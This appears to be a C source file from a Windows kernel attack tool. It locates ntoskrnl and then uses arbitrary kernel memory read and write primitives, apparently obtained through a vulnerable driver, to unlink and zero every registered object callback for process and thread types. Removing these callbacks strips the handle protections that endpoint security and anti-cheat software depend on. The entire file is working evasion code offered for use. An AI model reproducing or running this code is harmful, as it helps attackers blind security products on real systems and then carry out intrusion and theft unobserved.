#include "Callbacks.h"
#include "PdFwKrnl.h"
#include <stdio.h>
#include <string.h>
#include <wchar.h>

// -----------------------
// Constants
// -----------------------

#define STATUS_SUCCESS              ((LONG)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((LONG)0xC0000004L)

#define SystemModuleInformation    11

// _OBJECT_TYPE.CallbackList LIST_ENTRY head offset
#define OBJECT_TYPE_CALLBACKLIST   0xC8

// OB_CALLBACK_ENTRY field offsets (from the LIST_ENTRY node address)
#define OBP_ENTRY_ENABLED          0x14
#define OBP_ENTRY_PREOP            0x28
#define OBP_ENTRY_POSTOP           0x30

#define MAX_OB_ENTRIES             64

// -----------------------
// Internal types
// -----------------------

typedef LONG(WINAPI* FnNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    CHAR   FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
    ULONG                          NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

// -----------------------
// Internal helpers
// -----------------------

// Walks the doubly-linked CallbackList in an _OBJECT_TYPE and unlinks every
// OB_CALLBACK_ENTRY, zeroing Enabled, PreOperation, and PostOperation.
static VOID UnlinkCallbacksForType(
    _In_ HANDLE    hDev,
    _In_ ULONG_PTR uObjectTypeVA
)
{
    ULONG_PTR uListHead   = uObjectTypeVA + OBJECT_TYPE_CALLBACKLIST;
    ULONG_PTR uCurrent    = 0;
    ULONG_PTR uFlink      = 0;
    ULONG_PTR uBlink      = 0;
    ULONG_PTR uZeroPtr    = 0;
    USHORT    usEnabled   = 0;
    USHORT    usZeroShort = 0;
    DWORD     dwCount     = 0;

    if (!KernelReadMem(hDev, uListHead, &uCurrent, sizeof(uCurrent)))
    {
        printf("  [-] KernelReadMem CallbackList head failed\n");
        return;
    }

    while (uCurrent != uListHead && dwCount < MAX_OB_ENTRIES)
    {
        if (!KernelReadMem(hDev, uCurrent,        &uFlink, sizeof(uFlink)) ||
            !KernelReadMem(hDev, uCurrent + 0x08, &uBlink, sizeof(uBlink)))
            break;

        KernelReadMem(hDev, uCurrent + OBP_ENTRY_ENABLED, &usEnabled, sizeof(usEnabled));

        // Unlink: Blink->Flink = Flink
        KernelWriteMem(hDev, uBlink,        &uFlink, sizeof(uFlink));
        // Unlink: Flink->Blink = Blink
        KernelWriteMem(hDev, uFlink + 0x08, &uBlink, sizeof(uBlink));

        // Zero Enabled, PreOperation, PostOperation
        KernelWriteMem(hDev, uCurrent + OBP_ENTRY_ENABLED, &usZeroShort, sizeof(usZeroShort));
        KernelWriteMem(hDev, uCurrent + OBP_ENTRY_PREOP,   &uZeroPtr,    sizeof(uZeroPtr));
        KernelWriteMem(hDev, uCurrent + OBP_ENTRY_POSTOP,  &uZeroPtr,    sizeof(uZeroPtr));

        printf("  [+] Unlinked OB_CALLBACK_ENTRY @ 0x%016I64X (Enabled=%u)\n",
            (ULONG64)uCurrent, (DWORD)usEnabled);

        uCurrent = uFlink;
        dwCount++;
    }

    if (dwCount == 0)
        printf("  [*] No callback entries found\n");
}

// -----------------------
// Functions
// -----------------------

BOOL GetNtoskrnlInfo(
    _Out_ PNTOS_INFO pInfo
)
{
    FnNtQuerySystemInformation      pfnNtQSI   = NULL;
    PRTL_PROCESS_MODULES            pModules   = NULL;
    ULONG                           cbBuffer   = 0x10000;
    ULONG                           cbNeeded   = 0;
    LONG                            lStatus    = STATUS_SUCCESS;
    DWORD                           dwIndex    = 0;
    PRTL_PROCESS_MODULE_INFORMATION pMod       = NULL;
    WCHAR                           wszWinDir[MAX_PATH] = { 0 };
    LPCWSTR                         pwszSysRoot         = L"\\SystemRoot";
    DWORD                           cchSysRoot          = 0;
    BOOL                            bFound              = FALSE;

    pfnNtQSI = (FnNtQuerySystemInformation)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation"
    );
    if (!pfnNtQSI)
        return FALSE;

    do
    {
        if (pModules)
            HeapFree(GetProcessHeap(), 0, pModules);

        pModules = (PRTL_PROCESS_MODULES)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY, cbBuffer
        );
        if (!pModules)
            return FALSE;

        lStatus   = pfnNtQSI(SystemModuleInformation, pModules, cbBuffer, &cbNeeded);
        cbBuffer += 0x1000;

    } while (lStatus == STATUS_INFO_LENGTH_MISMATCH);

    if (lStatus != STATUS_SUCCESS)
        goto _END_OF_FUNC;

    for (dwIndex = 0; dwIndex < pModules->NumberOfModules; dwIndex++)
    {
        pMod = &pModules->Modules[dwIndex];

        if (strstr(pMod->FullPathName, "ntoskrnl") ||
            strstr(pMod->FullPathName, "ntkrnlmp"))
        {
            pInfo->uBase = (ULONG_PTR)pMod->ImageBase;
            pInfo->uSize = (ULONG_PTR)pMod->ImageSize;

            MultiByteToWideChar(
                CP_ACP, 0, pMod->FullPathName, -1, pInfo->wszPath, MAX_PATH
            );

            // Map \SystemRoot\ -> actual Windows directory
            cchSysRoot = (DWORD)wcslen(pwszSysRoot);
            if (_wcsnicmp(pInfo->wszPath, pwszSysRoot, cchSysRoot) == 0)
            {
                WCHAR wszResolved[MAX_PATH] = { 0 };
                GetWindowsDirectoryW(wszWinDir, MAX_PATH);
                swprintf_s(wszResolved, MAX_PATH, L"%ls%ls",
                    wszWinDir, pInfo->wszPath + cchSysRoot);
                wcscpy_s(pInfo->wszPath, MAX_PATH, wszResolved);
            }

            bFound = TRUE;
            break;
        }
    }

_END_OF_FUNC:
    if (pModules)
        HeapFree(GetProcessHeap(), 0, pModules);

    return bFound;
}

ULONG_PTR GetExportKernelVA(
    _In_ HMODULE   hNtosUser,
    _In_ ULONG_PTR uKernelBase,
    _In_ LPCSTR    pszExport
)
{
    FARPROC   pUserAddr = NULL;
    ULONG_PTR uRva      = 0;

    pUserAddr = GetProcAddress(hNtosUser, pszExport);
    if (!pUserAddr)
        return 0;

    uRva = (ULONG_PTR)pUserAddr - (ULONG_PTR)hNtosUser;
    return uKernelBase + uRva;
}

BOOL RemoveObCallbacks(
    _In_ HANDLE     hDev,
    _In_ HMODULE    hNtosUser,
    _In_ PNTOS_INFO pNtos
)
{
    ULONG_PTR uVarVA      = 0;
    ULONG_PTR uObjectType = 0;

    // --- PsProcessType ---
    uVarVA = GetExportKernelVA(hNtosUser, pNtos->uBase, "PsProcessType");
    if (!uVarVA)
    {
        printf("  [-] GetExportKernelVA(PsProcessType) failed\n");
        return FALSE;
    }

    if (!KernelReadMem(hDev, uVarVA, &uObjectType, sizeof(uObjectType)))
    {
        printf("  [-] KernelReadMem PsProcessType failed\n");
        return FALSE;
    }

    printf("  [*] PsProcessType @ 0x%016I64X\n", (ULONG64)uObjectType);
    UnlinkCallbacksForType(hDev, uObjectType);

    // --- PsThreadType ---
    uVarVA = GetExportKernelVA(hNtosUser, pNtos->uBase, "PsThreadType");
    if (!uVarVA)
    {
        printf("  [-] GetExportKernelVA(PsThreadType) failed\n");
        return FALSE;
    }

    if (!KernelReadMem(hDev, uVarVA, &uObjectType, sizeof(uObjectType)))
    {
        printf("  [-] KernelReadMem PsThreadType failed\n");
        return FALSE;
    }

    printf("  [*] PsThreadType  @ 0x%016I64X\n", (ULONG64)uObjectType);
    UnlinkCallbacksForType(hDev, uObjectType);

    return TRUE;
}
